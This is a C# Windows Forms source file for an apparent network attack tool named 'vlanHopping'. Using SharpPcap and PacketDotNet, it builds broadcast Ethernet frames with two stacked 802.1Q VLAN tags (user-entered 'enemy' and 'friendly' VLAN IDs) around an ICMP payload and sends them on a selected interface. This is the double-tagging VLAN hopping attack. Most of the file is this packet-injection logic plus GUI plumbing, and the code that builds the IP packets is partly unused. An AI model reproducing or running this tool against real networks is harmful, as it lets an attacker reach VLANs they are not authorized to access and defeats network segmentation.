using PacketDotNet.Utils;
using PacketDotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpPcap;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace M15A3_MCWS
{
    public partial class vlanHopping : Form
    {
        public vlanHopping()
        {
            InitializeComponent();
            this.AutoScaleMode = AutoScaleMode.Dpi;
        }
        static ILiveDevice dev;
        static CaptureDeviceList cdl = CaptureDeviceList.Instance;
        static ushort friendlyVlan = 0;
        static ushort enemyVlan = 0;
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        public void leFuni(bool ipv6)
        {
            dev.Open();
            friendlyVlan = ushort.Parse(textBox1.Text);
            enemyVlan = ushort.Parse(textBox2.Text);
            EthernetPacket ep = new EthernetPacket(dev.MacAddress, PhysicalAddress.Parse("FF:FF:FF:FF:FF:FF"), EthernetType.None);
            Ieee8021QPacket zlobr = new Ieee8021QPacket(new ByteArraySegment(new byte[64]));
            zlobr.VlanIdentifier = enemyVlan;
            Ieee8021QPacket zlobr2 = new Ieee8021QPacket(new ByteArraySegment(new byte[64]));
            zlobr2.VlanIdentifier = friendlyVlan;
            if (ipv6)
            {
                IPv6Packet v6 = new IPv6Packet(new ByteArraySegment(new byte[64]));
                IcmpV6Packet icmp = new IcmpV6Packet(new ByteArraySegment(new byte[64]));
                ep.PayloadPacket = zlobr;
                zlobr.PayloadPacket = zlobr2;
                zlobr2.PayloadPacket = icmp;
                dev.SendPacket(ep);
            }
            else
            {
                IPv4Packet v6 = new IPv4Packet(new ByteArraySegment(new byte[64]));
                IcmpV4Packet icmp = new IcmpV4Packet(new ByteArraySegment(new byte[64]));
                ep.PayloadPacket = zlobr;
                zlobr.PayloadPacket = zlobr2;
                zlobr2.PayloadPacket = icmp;
                dev.SendPacket(ep);
            }
        }
        private void close(object sender, EventArgs e)
        {
            this.Close();
        }

        private void max(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void min(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        private void button3_Click(object sender, EventArgs e)
        {
            leFuni(checkBox1.Checked);
        }
        int x;
        string name;
        PhysicalAddress admac;
        string id;
        string desc;
        int i = 0;
        private void vlanHopping_Load(object sender, EventArgs e)
        {
            try
            {
                this.AutoScaleMode = AutoScaleMode.Dpi;
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface n in nics)
                {
                    if (n.OperationalStatus == OperationalStatus.Up)
                    {
                        admac = n.GetPhysicalAddress();
                        name = n.Name;
                        desc = n.Description;
                        id = n.Id;
                        break;
                    }
                    else
                    {
                        x++;
                    }
                }
                foreach (ILiveDevice d in cdl)
                {
                    if (d.MacAddress == admac && d.Name == name)
                    {
                        dev = d;
                    }
                }
                if (cdl.Count > 0)
                {
                    foreach (ILiveDevice d in cdl)
                    {
                        comboBox1.Items.Insert(i, i + ") " + d.Name + d.Description + " | MAC Address: " + d.MacAddress);
                        i++;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            dev = cdl[comboBox1.SelectedIndex];
        }
    }
}
